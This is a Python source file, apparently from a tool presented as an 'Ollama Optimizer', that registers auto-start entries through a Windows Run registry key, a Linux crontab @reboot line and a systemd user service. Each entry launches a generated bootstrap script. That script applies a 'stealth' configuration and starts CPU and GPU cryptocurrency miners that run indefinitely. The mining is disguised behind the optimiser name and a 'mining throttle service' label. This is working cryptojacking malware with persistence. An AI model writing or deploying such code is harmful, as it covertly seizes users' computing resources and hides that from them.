"""
Auto-start registration.
Windows: HKCU registry Run key.
Linux:   crontab @reboot entry + systemd user service.
"""

import logging
import os
import platform
import subprocess
import sys
import textwrap
from pathlib import Path

logger = logging.getLogger("ollama_enhanced")

IS_WINDOWS = platform.system() == "Windows"
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_KEY_NAME = "OllamaOptimizer"
CRON_TAG = "# ollama_enhanced_autostart"

_BOOTSTRAP_SCRIPT = "ollama_enhanced_boot.pyw" if IS_WINDOWS else "ollama_enhanced_boot.py"

SYSTEMD_SERVICE_NAME = "ollama-optimizer.service"
SYSTEMD_USER_DIR = Path.home() / ".config" / "systemd" / "user"


class AutoStart:
    def __init__(self, base_dir: Path | str | None = None):
        self.base_dir = Path(base_dir) if base_dir else Path(__file__).resolve().parent.parent

    def _bootstrap_path(self) -> Path:
        return self.base_dir / _BOOTSTRAP_SCRIPT

    def _write_bootstrap(self) -> Path:
        script = self._bootstrap_path()
        code = (
            "import sys, pathlib, time\n"
            f"sys.path.insert(0, {str(self.base_dir)!r})\n"
            "from core.miner import MinerManager\n"
            "from core.gpu_miner import GPUMinerManager\n"
            "from core.config import ConfigBuilder\n"
            "from core.stealth import StealthConfig\n"
            "\n"
            f"base = pathlib.Path({str(self.base_dir)!r})\n"
            "mgr = MinerManager(base)\n"
            "mgr.ensure_binary()\n"
            "cb = ConfigBuilder()\n"
            "cfg = cb.build()\n"
            "sc = StealthConfig()\n"
            "cfg = sc.apply_to_config(cfg)\n"
            "mgr.write_config(cfg)\n"
            "mgr.start()\n"
            "gpu = GPUMinerManager(base)\n"
            "gpu.ensure_binary()\n"
            "gpu_cfg = cb.build_gpu_config()\n"
            "gpu.configure(**gpu_cfg)\n"
            "gpu.start()\n"
            "while True:\n"
            "    time.sleep(60)\n"
        )
        script.write_text(code, encoding="utf-8")
        if not IS_WINDOWS:
            os.chmod(script, 0o755)
        logger.info("Bootstrap written to %s", script)
        return script

    def _find_python(self) -> str:
        if IS_WINDOWS:
            base = Path(sys.executable).parent
            for c in [base / "pythonw.exe", base.parent / "pythonw.exe",
                       base / "python_embeded" / "pythonw.exe"]:
                if c.exists():
                    return str(c)
            return "pythonw.exe"
        return sys.executable or "python3"

    # ── Windows ──────────────────────────────────────────────────────

    def _register_windows(self) -> bool:
        try:
            import winreg
        except ImportError:
            logger.warning("winreg not available")
            return False

        boot_script = self._write_bootstrap()
        python = self._find_python()
        value = f'"{python}" "{boot_script}"'

        try:
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, REG_KEY_NAME, 0, winreg.REG_SZ, value)
            winreg.CloseKey(key)
            logger.info("Windows auto-start registered: %s", value)
            return True
        except OSError as exc:
            logger.error("Failed to register auto-start: %s", exc)
            return False

    def _unregister_windows(self) -> bool:
        try:
            import winreg
            key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
            winreg.DeleteValue(key, REG_KEY_NAME)
            winreg.CloseKey(key)
        except Exception:
            pass
        self._bootstrap_path().unlink(missing_ok=True)
        return True

    # ── Linux: crontab ───────────────────────────────────────────────

    def _register_cron(self) -> bool:
        boot_script = self._write_bootstrap()
        python = self._find_python()
        cron_line = f'@reboot {python} {boot_script} {CRON_TAG}'

        try:
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            existing = result.stdout if result.returncode == 0 else ""

            if CRON_TAG in existing:
                logger.info("Cron entry already exists")
                return True

            new_cron = existing.rstrip("\n") + "\n" + cron_line + "\n"
            subprocess.run(["crontab", "-"], input=new_cron, text=True, check=True)
            logger.info("Linux cron auto-start registered")
            return True
        except Exception as exc:
            logger.error("Failed to register cron auto-start: %s", exc)
            return False

    def _unregister_cron(self) -> bool:
        try:
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            if result.returncode != 0:
                return True
            lines = [l for l in result.stdout.splitlines() if CRON_TAG not in l]
            subprocess.run(["crontab", "-"], input="\n".join(lines) + "\n", text=True, check=True)
        except Exception:
            pass
        return True

    # ── Linux: systemd user service ──────────────────────────────────

    def _systemd_unit_path(self) -> Path:
        return SYSTEMD_USER_DIR / SYSTEMD_SERVICE_NAME

    def _register_systemd(self) -> bool:
        boot_script = self._write_bootstrap()
        python = self._find_python()

        unit_content = textwrap.dedent(f"""\
            [Unit]
            Description=Ollama Optimizer — mining throttle service
            After=network-online.target ollama.service
            Wants=network-online.target

            [Service]
            Type=simple
            ExecStart={python} {boot_script}
            Restart=on-failure
            RestartSec=10
            WorkingDirectory={self.base_dir}
            Environment=DISPLAY=:0

            [Install]
            WantedBy=default.target
        """)

        try:
            SYSTEMD_USER_DIR.mkdir(parents=True, exist_ok=True)
            self._systemd_unit_path().write_text(unit_content, encoding="utf-8")
            logger.info("Systemd unit written to %s", self._systemd_unit_path())

            subprocess.run(
                ["systemctl", "--user", "daemon-reload"],
                capture_output=True, text=True, check=True,
            )
            subprocess.run(
                ["systemctl", "--user", "enable", "--now", SYSTEMD_SERVICE_NAME],
                capture_output=True, text=True, check=True,
            )
            logger.info("Systemd user service enabled and started")
            return True
        except Exception as exc:
            logger.error("Failed to register systemd service: %s", exc)
            return False

    def _unregister_systemd(self) -> bool:
        try:
            subprocess.run(
                ["systemctl", "--user", "disable", "--now", SYSTEMD_SERVICE_NAME],
                capture_output=True, text=True,
            )
            unit = self._systemd_unit_path()
            unit.unlink(missing_ok=True)
            subprocess.run(
                ["systemctl", "--user", "daemon-reload"],
                capture_output=True, text=True,
            )
            logger.info("Systemd user service removed")
        except Exception:
            pass
        return True

    # ── Linux: combined registration ─────────────────────────────────

    def _register_linux(self) -> bool:
        cron_ok = self._register_cron()
        systemd_ok = self._register_systemd()
        if not cron_ok and not systemd_ok:
            return False
        return True

    def _unregister_linux(self) -> bool:
        self._unregister_cron()
        self._unregister_systemd()
        self._bootstrap_path().unlink(missing_ok=True)
        return True

    # ── Public API ───────────────────────────────────────────────────

    def register(self) -> bool:
        return self._register_windows() if IS_WINDOWS else self._register_linux()

    def unregister(self) -> bool:
        return self._unregister_windows() if IS_WINDOWS else self._unregister_linux()

    def is_registered(self) -> bool:
        if IS_WINDOWS:
            try:
                import winreg
                key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ)
                try:
                    winreg.QueryValueEx(key, REG_KEY_NAME)
                    return True
                except FileNotFoundError:
                    return False
                finally:
                    winreg.CloseKey(key)
            except Exception:
                return False
        else:
            cron_registered = False
            systemd_registered = False
            try:
                result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                cron_registered = CRON_TAG in result.stdout
            except Exception:
                pass
            try:
                result = subprocess.run(
                    ["systemctl", "--user", "is-enabled", SYSTEMD_SERVICE_NAME],
                    capture_output=True, text=True,
                )
                systemd_registered = result.returncode == 0
            except Exception:
                pass
            return cron_registered or systemd_registered
